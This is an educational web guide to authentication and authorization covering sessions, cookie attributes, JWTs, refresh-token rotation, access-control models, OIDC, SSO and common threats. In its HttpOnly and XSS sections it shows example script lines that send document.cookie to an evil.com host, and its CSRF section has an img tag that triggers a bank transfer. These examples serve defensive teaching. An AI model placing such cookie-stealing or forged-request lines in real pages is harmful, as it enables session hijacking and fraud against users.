Section 01
Foundations
Authentication, Authorization, Identity, and Trust — from first principles

What is Authentication?

Authentication is the process of verifying who you are. It answers the question: "Are you who you claim to be?"

Think of it as proving your identity. When you present a passport at an airport, you're proving your identity. The passport officer is performing authentication — checking whether the person standing in front of them matches the document.

📌 Key Insight

Authentication is always about verification of identity. The system doesn't inherently trust anyone — it demands proof. After proof is provided, the system knows who it's dealing with.

What is Authorization?

Authorization is the process of determining what you're allowed to do. It answers: "Are you allowed to do this?"

After authentication (you've proven who you are), authorization determines your permissions. A hotel keycard authenticates you (it knows your room number) but authorizes you only for specific floors, rooms, and amenities.

✅ The Critical Distinction

Authentication (AuthN)

"Who are you?"
Verifies identity
Happens first
Examples: password, fingerprint, certificate

Authorization (AuthZ)

"What can you do?"
Verifies permissions
Happens after AuthN
Examples: roles, policies, ACLs

Real-World Analogies

✈️ Airport Analogy

Your passport = credential. The boarding pass = authorization token. TSA agents = authentication system. Gate restrictions = authorization rules. First class lounge = resource with elevated authorization requirements.

🏨 Hotel Analogy
+

At check-in, you present your ID (authentication). The hotel verifies you are who you claim to be and gives you a keycard. The keycard encodes your authorized rooms: room 412, gym, pool. The master key that housekeeping uses? Same authentication system, completely different authorization scope. An admin keycard opens every door.

💡 Key Concept

The keycard is a token. It contains encoded information about who you are and what you're permitted to do. This is exactly how web authentication tokens work.

🏦 Bank Analogy
+

At a bank ATM: Your card is your identity assertion. Your PIN verifies you possess the credential (authentication). Your account balance and daily withdrawal limit are what you're authorized to access.

  • Card + PIN = Multi-factor authentication
  • Account access = Basic authorization
  • Withdrawal limit = Resource-level authorization constraint
  • Joint account = Shared authorization scope
  • Blocked card = Revoked authorization

Credentials

A credential is evidence used to prove identity. It's what you present during authentication. Credentials come in three factors — security experts call these factors of authentication:

Something You Know

Passwords, PINs, security questions, passphrases

Knowledge Factor

Something You Have

Hardware tokens, TOTP apps, smart cards, phone

Possession Factor

Something You Are

Fingerprint, face ID, iris scan, voice

Inherence Factor
⚠️ Multi-Factor Authentication (MFA)

Using credentials from two or more different factors is MFA. A password (knowledge) + SMS code (possession) = 2FA. Using two passwords does NOT count as 2FA — they're the same factor. Combining factors is what creates security value, not just the quantity.

Trust and Security Boundaries

A security boundary is a logical or physical perimeter that separates one trust zone from another. Crossing a boundary requires authentication and authorization decisions.

Trust Zones in a Web Application

The concept of Zero Trust challenges the old idea of "trust but verify inside the network." Modern architectures assume any component could be compromised and require authentication and authorization at every boundary crossing, even between internal services.

HTTP (HyperText Transfer Protocol) is how browsers and servers communicate. Every time you load a webpage, click a button, or submit a form, an HTTP request is made. HTTP is fundamentally stateless — each request is completely independent, carrying no memory of previous requests.

HTTPS: Encryption in Transit

HTTPS = HTTP + TLS (Transport Layer Security). TLS provides three guarantees:

Confidentiality

Data is encrypted. Even if an attacker intercepts packets, they can't read the content.

🔒 Encryption

Integrity

Data cannot be modified in transit without detection. Tampering is impossible.

✅ HMAC

Authentication

Certificates prove you're talking to the real server, not an impostor (prevents MITM).

🏛️ PKI
🚨 Security Warning

Never send authentication credentials over plain HTTP. Passwords, tokens, and session IDs are visible to anyone on the network. Always enforce HTTPS with Strict-Transport-Security headers and redirect all HTTP traffic to HTTPS.

The Stateless Problem

HTTP is stateless — the server has no memory between requests. Request #1 and Request #2 could come from completely different clients as far as HTTP is concerned. This creates the core authentication challenge:

The Stateless Problem — Server Doesn't Remember You
Request 1: "Hi, I'm Alice, my password is xyz" → Authenticated ✅
Server forgets everything
Request 2: "Give me Alice's data" → WHO ARE YOU? Server has no memory ❌
Solution needed
Send proof with every request (session cookie, token, etc.)

Authentication systems exist to solve this fundamental problem: how does a stateless protocol maintain identity across multiple requests? The two primary solutions are sessions (stateful) and tokens (stateless).

Section 03
Sessions
Stateful authentication — how servers remember who you are

What is a Session?

A session is a server-side record that ties an anonymous HTTP connection to a specific authenticated user. It's stateful — the server maintains state about the logged-in user between requests.

Think of it as a coat check at a restaurant. You hand over your coat (credentials), the attendant stores it and gives you a numbered ticket (session ID). Every time you need your coat or want to add something, you show your ticket. The attendant looks up your coat from the number. The ticket itself contains no information about your coat — just an ID that maps to the actual data.

Session ID: The Key Concept

A session ID is a random, unpredictable token — typically 128 bits (32 hex characters) of cryptographic randomness. It has no meaning on its own. It's purely a lookup key.

🚨 Security Warning: Session ID Properties
  • Must be cryptographically random — predictable IDs allow session guessing attacks
  • Must be long enough — minimum 128 bits to prevent brute force
  • Must be unique — no two sessions share an ID
  • Must be regenerated after privilege escalation — prevents session fixation (more on this in Section 17)
  • Never use sequential numbers, usernames, or predictable patterns

Session Storage Options

🔴 Redis Session Store (Most Common in Production)

  • Extremely fast (in-memory, sub-millisecond)
  • Native TTL support (auto-expiry)
  • Horizontally scalable
  • Easy session invalidation (just delete the key)
  • Survives app server restarts

❌ Disadvantages

  • Another infrastructure component to manage
  • Network hop for each auth check
  • Data is lost if Redis crashes (without persistence)
  • Cost of Redis cluster in cloud
🗄️ Database Session Store
+

💾 In-Memory Session Store (Development Only)
+

Default for most frameworks in development mode. Sessions are stored in the Node.js/Python/Java process memory. Never use in production — sessions are lost on restart, don't work with multiple app servers, and will cause memory leaks under load.

🚨 Never in Production

Express's default MemoryStore explicitly warns: "MemoryStore is not designed for a production environment, as it will leak memory under most conditions, does not scale past a single process, and is meant only for debugging and developing."

Session Lifecycle

Session Creation
After successful authentication. New session ID generated. Session data stored. Cookie sent.
Session Validation (Every Request)
Cookie received → Session ID extracted → Lookup in store → Validate expiry → Load user context.
Session Renewal
Sliding window: extend expiry on each request. Absolute timeout: hard limit regardless of activity.
Session Destruction (Logout)
Server deletes session from store. Browser cookie cleared. Session ID becomes invalid immediately.

Automatic via TTL. Cleanup jobs for DB stores. User must re-authenticate.
Section 04
Cookies
The browser's native state mechanism — every attribute explained

What Are Cookies?

Cookies are small key-value pairs stored by the browser, set by a server's Set-Cookie response header. The browser automatically sends matching cookies back in the Cookie request header on subsequent requests. This is the mechanism that enables sessions to work across the stateless HTTP protocol.

Setting a Cookie (Server → Browser)
Set-Cookie: session_id=xK8mN2pQ9rT3vW7y; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400; Domain=.example.com
Browser Sends Cookie Back (Browser → Server)
Cookie: session_id=xK8mN2pQ9rT3vW7y; theme=dark; lang=en

Cookie Attributes — Deep Dive

🔒 HttpOnly — Prevents JavaScript Access
+

When HttpOnly is set, the cookie is inaccessible to JavaScript. document.cookie will not show it. It can only be sent to the server via HTTP.

Without HttpOnly

// Attacker's XSS script can do: document.cookie // "session_id=xK8mN2pQ; lang=en" // Send to attacker's server: fetch('https://evil.com/steal?c=' + document.cookie)
❌ XSS vulnerable

With HttpOnly

// Same XSS script now sees: document.cookie // "lang=en" // session_id is invisible! // Attacker gets nothing valuable // Session is protected ✅
✅ XSS protected
⚠️ Important Nuance

HttpOnly prevents JavaScript from reading the cookie. It does not prevent the cookie from being sent. A CSRF attack can still cause the browser to send the cookie to a malicious endpoint (which is why SameSite exists).

🔐 Secure — HTTPS Only
+

The Secure attribute means the cookie is only sent over HTTPS connections. If the user visits http:// (plain HTTP), the cookie is not sent. This prevents interception on unencrypted networks (coffee shops, public WiFi).

🚨 Always Set Secure in Production

Without Secure, your session cookie could be sent over HTTP and captured by a network attacker performing a man-in-the-middle attack. Combine with Strict-Transport-Security header to prevent HTTP downgrade attacks.

🛡️ SameSite — CSRF Protection
+

Controls when cookies are sent in cross-site requests. This is the primary modern defense against CSRF attacks.

ValueBehaviorCSRF ProtectionUse Case
Strict Cookie only sent for same-site requests. Never sent from external sites, even when navigating to your site. Maximum Banking, admin panels — where being "signed out" when clicking a link is acceptable
Lax Cookie sent for same-site requests AND top-level navigations (clicking a link). NOT sent for embedded images, iframes, AJAX from other sites. Good Most web apps — user remains logged in when clicking links from other sites (e.g., email links)
None Cookie sent in all contexts. Must also set Secure. None Third-party integrations, embedded widgets, cross-site SSO iframes
💡 Browser Default

Modern browsers default to SameSite=Lax if not specified. Always explicitly set SameSite rather than relying on defaults.

🌐 Domain — Subdomain Scope
+

The Domain attribute controls which domains receive the cookie.

// No Domain set → Only exact domain receives cookie // api.example.com sets it → only api.example.com gets it Set-Cookie: session=abc; // No domain attr → host-only // Domain=.example.com → All subdomains receive it // app.example.com, api.example.com, admin.example.com all get it Set-Cookie: session=abc; Domain=.example.com // ⚠️ Security concern: if any subdomain is compromised, // it can read or overwrite cookies for all subdomains
📂 Path — URL Path Scope
+

Path restricts which URL paths the cookie is sent to. Path=/ means all paths. Path=/api means only requests to /api/* send the cookie.

For session cookies, almost always use Path=/ to ensure the session cookie is sent with every request. Using a more restrictive path can cause authentication failures for legitimate requests.

⏱️ Expires vs Max-Age — Cookie Lifetime
+

Expires

Absolute date/time: Expires=Thu, 01 Jan 2026 00:00:00 GMT. Older attribute. Subject to clock skew between browser and server.

Max-Age

Relative seconds from now: Max-Age=86400. Preferred. Overrides Expires if both present.

Session Cookies: If neither is set, the cookie is a "session cookie" — it expires when the browser is closed (though many browsers now restore tabs, which preserves these).

Complete Cookie Security Checklist

  • ✅
    HttpOnly — Prevents JavaScript access, protects against XSS token theft
  • ✅
    Secure — Only send over HTTPS, prevents network interception
  • ✅
    SameSite=Strict or Lax — Prevents CSRF attacks
  • ✅
    Path=/ — Explicit path scoping
  • ✅
    Max-Age or Expires — Explicit expiry, not indefinite
  • ⚠️
    Domain — Only set if cross-subdomain access needed, avoid unnecessary scope
  • ❌
    Never store sensitive data in non-HttpOnly cookies — Use HttpOnly for session IDs
Section 05
HttpOnly Deep Dive
XSS protection, browser behavior, and exact attack prevention mechanics

Exactly What HttpOnly Does

When a cookie has the HttpOnly flag, the browser enforces a strict rule: this cookie may only be transmitted via HTTP/HTTPS headers — never exposed to client-side scripts.

JavaScript
What JS can and cannot see
// Server sets these cookies: // Set-Cookie: session_id=ABC123; HttpOnly; Secure // Set-Cookie: user_pref=dark_mode // Set-Cookie: tracking_id=XYZ789 // In browser JavaScript: console.log(document.cookie); // Output: "user_pref=dark_mode; tracking_id=XYZ789" // session_id is COMPLETELY INVISIBLE to JS ✅ // Even with Object.keys, getOwnPropertyNames, etc.: // There is NO WAY to access HttpOnly cookies from JS // The browser enforces this at the engine level // Trying to set an HttpOnly cookie from JS also fails silently: document.cookie = "session_id=FAKE; HttpOnly"; // HttpOnly attribute is IGNORED when set via JS // (only servers can set HttpOnly cookies)

XSS Attack Prevention Mechanics

⚔️ XSS Attack Without HttpOnly (Session Hijacking)
1. Attacker finds XSS vulnerability
A comment field on a forum doesn't sanitize input. Attacker posts: <script>/* malicious */</script>
2. Victim visits the page
Browser renders the page, executes the malicious script in the context of the legitimate domain.
3. Script exfiltrates session cookie
fetch('https://evil.com/?c=' + document.cookie) — sends session_id to attacker's server.
4. Attacker hijacks session
Attacker uses the stolen session_id cookie in their browser — they are now logged in as the victim.
✅ With HttpOnly — Attack Defeated
Steps 1-2 same as above
Attacker finds XSS, victim visits page, script executes.
3. Script tries to read cookies
document.cookie returns only non-HttpOnly cookies. session_id is not there. Attack fails.

Note: XSS can still do other damage (execute actions as the user, modify page content). HttpOnly only prevents cookie theft specifically. Input validation and Content Security Policy (CSP) are still essential.

HttpOnly and Network Requests

Even with HttpOnly, the cookie is still sent automatically by the browser on every matching HTTP request. This is key — it means:

  • Your frontend code doesn't need to manually attach the session cookie (browser does it automatically)
  • JavaScript fetch() and XMLHttpRequest will include HttpOnly cookies if credentials: 'include' is set
  • The server can read and set HttpOnly cookies normally via response headers
JavaScript
Sending credentials with fetch (includes HttpOnly cookies)
// ✅ This works — browser includes HttpOnly session cookie const response = await fetch('/api/protected-endpoint', { credentials: 'include', // Required for cross-origin cookie sending headers: { 'Content-Type': 'application/json' } }); // The session cookie (HttpOnly) is automatically sent in headers // even though JavaScript cannot READ the cookie value

⚠️ The JWT in localStorage Debate

Many tutorials store JWTs in localStorage because it's easy. This is a security mistake for sensitive applications. Any XSS vulnerability — including in a third-party library you're using — can steal the token. HttpOnly cookies are harder to work with but significantly more secure.

The trade-off: localStorage is immune to CSRF but vulnerable to XSS. HttpOnly cookies are immune to XSS but require CSRF protection. In 2026, with SameSite=Strict well-supported, HttpOnly cookies with SameSite is the strongest option.

Section 07
JWT Fundamentals
JSON Web Tokens — structure, encoding, claims, and cryptographic signing

Why JWT Was Invented

Sessions require the server to store state (in Redis, DB, etc.). This creates problems at scale: what if you have 100 app servers? They all need access to the same session store. JWT solves this by making authentication stateless — the token itself contains everything needed to verify identity, with no server-side storage required.

💡 The Core Insight

A JWT is like a cryptographically signed passport. Instead of storing "user 42 is logged in" on the server, the server issues a signed document that says "I certify that the bearer of this document is user 42 with role admin." Any server with the signing key can verify this document independently.

JWT Structure: Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfYWJjMTIzIiwibmFtZSI6IkFsaWNlIENoZW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3MDk1MDAwMDAsImV4cCI6MTcwOTU4NjQwMH0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header (Red)

{ "alg": "HS256", "typ": "JWT" }

Algorithm used to sign and type of token. Base64URL encoded.

Payload (Purple)

{ "sub": "usr_abc123", "name": "Alice Chen", "role": "admin", "iat": 1709500000, "exp": 1709586400 }

Claims — data about the user. Base64URL encoded. NOT encrypted.

Signature (Cyan)

HMACSHA256( base64url(header) + "." + base64url(payload), secret_key )

Cryptographic proof that header + payload weren't tampered with.

🚨 Critical: JWTs Are NOT Encrypted by Default

The payload is only Base64URL encoded, not encrypted. Anyone who gets the JWT can decode the payload and read its contents. Never store sensitive data (SSNs, passwords, PII beyond what's necessary) in a JWT payload. Encryption requires JWE (JSON Web Encryption) — a different standard.

JWT Claims Explained

ClaimFull NameTypeDescriptionExample
sub Subject Registered Unique identifier for the user. Never reuse this value. "usr_abc123"
iss Issuer Registered Who created the token. Typically your auth server URL. "https://auth.example.com"
aud Audience Registered Who the token is intended for. Validate this on the receiving service. "api.example.com"
exp Expiration Registered Unix timestamp after which token must be rejected. Always set this. 1709586400
iat Issued At Registered Unix timestamp when token was created. Used for age validation. 1709500000
nbf Not Before Registered Token not valid before this time. Rarely used but useful for scheduled access. 1709502000
jti JWT ID Registered Unique ID for the token. Enables single-use tokens and replay prevention. "d2a4e5f1-..."
role, email, ... Custom Claims Private Application-specific data agreed on between parties. "role": "admin"

Signing Algorithms

AlgorithmTypeKeyUse CaseRecommendation
HS256/384/512 HMAC-SHA Shared secret Single server, same secret signs and verifies ⚠️ OK if key secured
RS256/384/512 RSA-SHA Private/Public key pair Auth server signs (private), resource servers verify (public) ✅ Recommended
ES256/384/512 ECDSA-SHA Elliptic curve key pair Same as RS256 but smaller keys, faster operations ✅ Best for modern systems
none Unsigned None Development/testing only ❌ Never in production
🚨 The alg=none Attack

Early JWT libraries allowed alg: "none" — unsigned tokens that would be accepted as valid. An attacker could forge any token. Always explicitly specify allowed algorithms on the server and reject none. This is why modern libraries force you to specify algorithms: ['RS256'].

The definitive deep comparison — when to use each approach

The Revocation Problem — JWT's Achilles Heel

🚨 JWT Revocation is Hard

If Alice's access token is stolen, or she is fired/banned, her JWT remains valid until it expires. If you use 24-hour JWTs, a fired employee retains access for up to 24 hours. Solutions:

  • Short expiry: Use 15-minute access tokens. Most damage is contained.
  • Token denylist: Store revoked token JTI claims in Redis. Check on every request. This adds state — you've recreated sessions.
  • Version claim: Store a token_version in user DB. Include in JWT. Increment on logout/ban. Check on each request. Still a DB hit.

When to Use Each

Use Sessions When:

  • Building a traditional web app
  • Instant revocation is critical (banking, healthcare)
  • Single server or centralized architecture
  • Data freshness is important (roles change frequently)
  • You want simpler logout behavior

Use JWT When:

  • Microservices or distributed systems
  • Mobile apps where cookies are inconvenient
  • Cross-domain API access (multiple domains/services)
  • Stateless serverless functions
  • Short-lived tokens where revocation is less critical

Refresh Token Rotation & Theft Detection

🔄 Refresh Token Rotation

Every time a refresh token is used, it is invalidated and replaced with a new one. This limits the window of opportunity for a stolen refresh token: it can only be used once before becoming invalid.

🕵️ Theft Detection

If an attacker steals a refresh token and uses it, then the legitimate user tries to refresh, the server will detect that a token was used twice. The second use fails (token already rotated). This is a signal of compromise — the server should invalidate the entire token family and force re-login.

Node.js
Refresh token with rotation + theft detection
async function handleRefresh(req, res) { const oldRefreshToken = req.cookies.refresh_token; if (!oldRefreshToken) return res.status(401).end(); const tokenRecord = await db.findRefreshToken(oldRefreshToken); if (!tokenRecord) { // Token not found — possibly already rotated (reuse detected!) // This is a theft signal — invalidate entire token family await db.invalidateTokenFamily(oldRefreshToken); res.clearCookie('refresh_token'); return res.status(401).json({ error: 'token_reuse_detected' }); } if (tokenRecord.expiresAt < new Date()) { await db.deleteRefreshToken(tokenRecord.id); return res.status(401).json({ error: 'refresh_token_expired' }); } // Rotate: delete old, create new await db.deleteRefreshToken(tokenRecord.id); const newRefreshToken = generateSecureToken(); await db.createRefreshToken({ token: newRefreshToken, userId: tokenRecord.userId, family: tokenRecord.family, // track token lineage for theft detection expiresAt: addDays(new Date(), 30) }); const newAccessToken = signJWT({ sub: tokenRecord.userId }, '15m'); res.cookie('access_token', newAccessToken, cookieOptions); res.cookie('refresh_token', newRefreshToken, { ...cookieOptions, path: '/auth/refresh', // only sent to /auth/refresh maxAge: 30 * 24 * 60 * 60 * 1000 }); res.json({ ok: true }); }
Section 12
Authorization Systems
RBAC, ABAC, ReBAC — controlling what authenticated users can do

Authentication ≠ Authorization

Authentication proves who you are. Authorization determines what you're allowed to do. They're separate systems that work in sequence. You can't authorize without first authenticating, but knowing who someone is doesn't automatically determine what they can do.

Role-Based Access Control (RBAC)

The most common authorization model. Users are assigned to roles. Roles have permissions. Permissions define what operations can be performed on what resources.

RBAC Structure
Node.js
RBAC middleware
// Define permissions per role const ROLE_PERMISSIONS = { admin: ['users:read', 'users:write', 'users:delete', 'posts:*', 'settings:*'], editor: ['posts:read', 'posts:write', 'posts:delete', 'users:read'], viewer: ['posts:read', 'users:read'], }; // Middleware factory function requirePermission(permission) { return (req, res, next) => { const { role } = req.user; // from JWT or session const permissions = ROLE_PERMISSIONS[role] || []; const hasPermission = permissions.some(p => p === permission || p.endsWith('*') && permission.startsWith(p.slice(0, -1)) ); if (!hasPermission) { return res.status(403).json({ error: 'Forbidden' }); } next(); }; } // Usage router.delete('/users/:id', requirePermission('users:delete'), deleteUserHandler); router.get('/posts', requirePermission('posts:read'), listPostsHandler);

Attribute-Based Access Control (ABAC)

ABAC grants access based on attributes of the user, resource, action, and environment. More flexible than RBAC but more complex to implement.

JavaScript
ABAC policy example
// Access is granted if policy evaluates to true const canEditPost = (user, post, environment) => // Author can always edit their own posts user.id === post.authorId || // Admins can edit any post user.role === 'admin' || // Editors can edit posts in their department, during business hours (user.role === 'editor' && user.department === post.department && environment.isBusinessHours);

Relationship-Based Access Control (ReBAC)

Access decisions are based on the graph relationships between users and resources. Google Zanzibar (powering Google Docs) is the canonical example. "Can user A edit document D?" is answered by traversing: Is A an editor of D? Is A a member of a group that is an editor of D? Does A have access to a parent folder of D?

Modern implementation: Google Zanzibar, OpenFGA, Ory Keto. Used when permissions form complex hierarchies (e.g., file system, org charts, GitHub-style repositories).

Section 14
OpenID Connect (OIDC)
The authentication layer on top of OAuth 2.0

Why OAuth Is Not Authentication

OAuth 2.0 is an authorization protocol — it grants access to resources. It does not define how to get the user's identity. Using OAuth's access token as an authentication mechanism is wrong because:

  • The access token format is undefined (could be opaque or JWT)
  • No standard endpoint to get user info
  • The token may not identify a user at all (Client Credentials flow)
  • Tokens can be created by third parties
💡 OIDC Solves This

OpenID Connect is a thin identity layer built on top of OAuth 2.0. It adds a standardized ID token (a JWT containing user identity claims) and a UserInfo endpoint.

OAuth 2.0

  • Access token (opaque or JWT)
  • Answers: "What can this app do?"
  • No standard user info
  • Authorization protocol

OAuth 2.0 + OIDC

  • Access token + ID token
  • Answers: "Who is this user? + What can this app do?"
  • Standardized /userinfo endpoint
  • Authentication + Authorization

The ID Token

The ID token is always a JWT, issued by the Authorization Server, identifying the authenticated user. Key claims:

Section 15
Single Sign-On (SSO)
One login, many applications — how it actually works

What is SSO?

SSO allows users to authenticate once with a central Identity Provider (IdP) and access multiple applications without re-authenticating. Think of how logging into Google gives you access to Gmail, Google Drive, YouTube, and Google Docs — one login, many apps.

SSO Architecture

How SSO Works Technically

User visits App A
App A has no session for this user. Redirects to Identity Provider (IdP) with a request for authentication.
User authenticates with IdP
User logs in at IdP (Google, Okta, etc.). IdP creates an SSO session (typically a cookie on the IdP domain) and issues a token/assertion to App A.
App A establishes local session
App A validates the IdP token, creates its own local session, user is logged in to App A.
User visits App B
App B has no session. Redirects to IdP. But now the IdP already has an SSO session (cookie). IdP immediately issues a token to App B without asking the user to log in again.
App B establishes local session
User is logged in to App B seamlessly — they never saw a login screen.
💡 Single Logout (SLO)

The flip side of SSO. When a user logs out of one app, should they be logged out of all apps? SLO propagates logout events to all service providers. This is complex to implement correctly — not all IdPs support it, and apps must implement logout notification handlers.

Enterprise Authentication
SAML, LDAP, Active Directory, and Kerberos

SAML 2.0

Security Assertion Markup Language. An XML-based protocol for SSO primarily used in enterprise environments. Predates OAuth/OIDC. Still widely used for B2B integrations.

SAML Key Concepts

  • Identity Provider (IdP): Okta, OneLogin, ADFS
  • Service Provider (SP): Salesforce, Jira, Slack
  • Assertion: XML document with user identity claims
  • Metadata: XML config exchanged between IdP and SP

SAML vs OIDC

  • SAML uses XML; OIDC uses JSON/JWT
  • SAML is older (2005); OIDC is newer (2014)
  • SAML is hard to implement; OIDC has great library support
  • SAML is browser-centric; OIDC works for APIs/mobile
  • Enterprise legacy: SAML. New projects: OIDC

LDAP & Active Directory

LDAP (Lightweight Directory Access Protocol) is a protocol for querying and modifying directory services — databases of users, groups, and attributes. Active Directory (AD) is Microsoft's LDAP implementation, the dominant enterprise identity store.

LDAP

Kerberos

A network authentication protocol developed at MIT, widely used in Windows domains (Active Directory uses Kerberos). It uses symmetric key cryptography and a trusted third party called a Key Distribution Center (KDC).

🎟️ The Ticket Metaphor

Kerberos works like a theme park: you authenticate once at the ticket booth (KDC / Authentication Server), get a master ticket (TGT — Ticket Granting Ticket). When you want to access a specific ride (service), you show your master ticket at a service desk (Ticket Granting Server) and get a specific ride ticket (Service Ticket). You never show your password to the ride — only to the ticket booth.

Section 17
Security Threats
Attack vectors, mechanics, and defenses for every major auth threat
💉 Cross-Site Scripting (XSS)

Attack: Attacker injects malicious JavaScript into a webpage. The script runs in victim's browser, can read non-HttpOnly cookies, send data to attacker's server, perform actions as the user.

Auth impact: Session/token theft if not using HttpOnly cookies. Can perform authenticated actions regardless of token storage.

Defenses: Input sanitization (never trust user input), Output encoding (escape before rendering), Content Security Policy (CSP), HttpOnly cookies, X-XSS-Protection header.

🎭 Cross-Site Request Forgery (CSRF)

Attack: Attacker tricks victim's browser into making an authenticated request to your app. The browser automatically sends cookies, so the request appears legitimate even though the user didn't intend it.

<!-- Attacker's malicious page at evil.com --> <img src="https://bank.com/transfer?to=attacker&amount=10000"> <!-- Browser sends bank.com cookies with this image request! -->

Defenses: SameSite=Strict/Lax cookies (primary modern defense), CSRF tokens (synchronizer token pattern), Custom request headers (X-Requested-With for AJAX), Double-submit cookie pattern.

🔧 Session Fixation

Attack: Attacker provides a known session ID to the victim before login (e.g., via URL parameter). If the server doesn't regenerate the session ID after login, the attacker knows the victim's session ID.

Defense: Always regenerate the session ID after authentication. This is a critical requirement, not optional.

// ✅ After login, regenerate session: req.session.regenerate((err) => { // New session ID generated — old one invalid req.session.userId = user.id; });
🔁 Replay Attacks

Attack: Attacker intercepts a valid authentication token and replays it to gain access. Even if the channel is HTTPS, if the token is extracted (e.g., from logs), it can be reused.

Defenses: Short token expiry, Token binding (tie token to TLS session), nonce claims in JWTs (jti), One-time tokens for sensitive operations, mTLS (mutual TLS) for service-to-service.

🔑 Credential Stuffing

Attack: Attacker uses massive lists of leaked username/password combinations from other breaches. Because people reuse passwords, many work. Fully automated with tools like Sentry MBA.

Defenses: Rate limiting, CAPTCHA, IP-based blocking, Device fingerprinting, Breached password detection (HaveIBeenPwned API), Require MFA, Monitor for unusual login patterns.

🔓 Brute Force Attacks

Attack: Systematically try all possible passwords for an account. More targeted than credential stuffing.

Defenses: Account lockout (after N failed attempts), Exponential backoff, CAPTCHA after failed attempts, Strong password requirements, MFA (makes brute force of password alone insufficient).

🖱️ Clickjacking

Attack: Attacker embeds your app in a transparent iframe overlaid on a decoy page. User clicks what they think is a game button, but actually clicks a "Confirm Transfer" button on your bank app.

Defenses: X-Frame-Options: DENY, Content-Security-Policy: frame-ancestors 'none'. These prevent your app from being embedded in iframes on other domains.

🌐 Token Theft via Subdomain Takeover

Attack: If your cookie has Domain=.example.com, an attacker who takes over unused-subdomain.example.com (e.g., by pointing an abandoned DNS record to their server) can receive your session cookies.

Defenses: Audit and remove unused subdomains/DNS records. Use narrow Domain scope or host-only cookies where possible. Monitor DNS for unexpected changes.

Token Storage — Current Consensus

  • ✅
    Access tokens in HttpOnly + Secure + SameSite=Strict cookies for web apps. Best XSS protection, automatic handling.

    Never in localStorage for sensitive apps. XSS risk is too high.

WebAuthn & Passkeys

The future of authentication. WebAuthn is a W3C standard enabling passwordless authentication using public-key cryptography and hardware authenticators.

How Passkeys Work

  • Device generates a public-private key pair
  • Public key stored on server
  • Private key stored on device (Secure Enclave)
  • Authentication: challenge signed with private key
  • No password ever sent to server

Why Passkeys Are Superior

  • Phishing-resistant (bound to domain)
  • No password to steal or crack
  • No server-side password hashing to breach
  • Biometric verification on device (Face ID, fingerprint)
  • Synced via iCloud/Google Password Manager

Zero Trust Architecture

The principle: "Never trust, always verify." No network location is inherently trusted. Every access request must be authenticated and authorized regardless of where it originates — inside or outside the corporate network.

💡 Zero Trust Tenets
  • Verify explicitly: Always authenticate and authorize based on all available data points
  • Least privilege access: Limit user access with just-in-time and just-enough-access
  • Assume breach: Minimize blast radius, segment access, verify end-to-end encryption

Database Design
The data model behind users, sessions, roles, and refresh tokens

Core Tables

A good authentication database separates identity, credentials, sessions, and authorization data. That keeps login state, permission state, and audit state independent.

SQL
Typical schema sketch
CREATE TABLE sessions ( id uuid PRIMARY KEY, user_id uuid NOT NULL REFERENCES users(id), session_hash text NOT NULL UNIQUE, expires_at timestamptz NOT NULL, created_at timestamptz NOT NULL DEFAULT now() ); CREATE INDEX idx_sessions_user_id ON sessions(user_id); CREATE INDEX idx_sessions_expires_at ON sessions(expires_at);
Design principle

Store secrets as hashes, not plaintext. Put expiry on everything that can expire. Add indexes for lookup paths that happen on every request. And separate identity tables from audit/event tables so you can scale them independently.

Section 22
Interview Preparation
Questions and answers from junior to staff-level depth

Beginner Questions

1 What is the difference between authentication and authorization?
Authentication proves identity. Authorization decides access. In a system design answer, mention that authN usually happens first and authZ can be enforced at multiple layers: middleware, service, and database.
2 What is a session cookie?
It is a browser-stored identifier that points to server-side state. The cookie itself is not the state; the server session store is.

Intermediate Questions

3 Why is HttpOnly important?
It prevents JavaScript from reading the cookie value, which reduces token theft from XSS. It does not stop the browser from sending the cookie automatically on matching requests.
4 When would you choose JWT over sessions?
Use JWT when you need stateless verification across services or when multiple APIs must validate tokens without a shared session store. Use sessions when you need easy revocation, simpler logout, and smaller attack surface for browser apps.

Senior Questions

5 How do you revoke a JWT?
You usually cannot revoke a self-contained JWT immediately without an allowlist/denylist, a short expiry, or a version check against server state. That is why many production systems pair short-lived access tokens with refresh-token rotation or server-side session state.
6 How do you design auth for multi-tenant SaaS?
Add tenant context to every principal, enforce tenant isolation in authorization checks and database queries, and audit access by tenant. For enterprise tenants, delegate authentication to an external IdP while keeping authorization local to your app.

Staff Engineer Questions

7 What is your strategy for balancing security and usability?
Use adaptive controls: short-lived access tokens, rotating refresh tokens, MFA for risky actions, and passkeys where available. Make the default path safe, then add step-up authentication for high-risk operations.
8 How do you build an auth system that survives incidents?
Separate identity, session, policy, and audit planes. Design for key rotation, emergency revocation, observability, and backwards compatibility so you can invalidate credentials or change token formats without taking the system down.
Section 23
System Design Perspective
How a senior engineer thinks about authentication at scale

Scalability

Stateless tokens reduce per-request lookup pressure. Stateful sessions simplify revocation but require a shared store like Redis or a database cluster.

Availability

Auth should fail closed, but not become a single point of failure. Cache carefully, add redundancy, and keep the identity path separate from application traffic when possible.

Observability

Track login success, MFA challenges, refresh token rotation, suspicious IPs, and authorization denials. Good auth systems are measurable.

Prefer sessions or token versioning.

Prefer JWT access tokens with short expiry.

Use HttpOnly cookies and CSRF protections.

Staff-level framing

Authentication is not just a login feature. It is an organizational control plane for identity, trust, policy, and audit. At staff level, the question becomes: how do we keep that control plane secure, observable, recoverable, and compatible with product growth?

Section 24
Common Myths
Statements that sound true but break down in real systems
Myth
JWT is always better than sessions

JWTs solve some scaling problems, but they create revocation and storage trade-offs. For many browser apps, sessions are simpler and safer.

Myth
Cookies are insecure

Cookies are not insecure by default. Misconfiguration is insecure. HttpOnly, Secure, SameSite, and narrow Path/Domain settings make cookies a strong browser storage mechanism.

Myth
localStorage is fine if you use HTTPS

HTTPS protects data in transit, not against XSS. Anything readable by JavaScript can be stolen by injected script. That is the core problem with storing long-lived credentials in localStorage.

Myth
MFA means using more passwords

MFA requires different factors. Two passwords are still one factor. The point is to combine knowledge, possession, and inherence.

Security Checklist

  • ✓ Use HttpOnly, Secure, and SameSite for browser cookies.
  • ✓ Hash passwords with a strong adaptive algorithm.
  • ✓ Rotate refresh tokens and invalidate old ones.
  • ✓ Log auth events and authorization failures.
  • ! Keep access tokens short-lived.
  • ✗ Do not store long-lived secrets in localStorage.
  • ✗ Do not trust the client for authorization decisions.
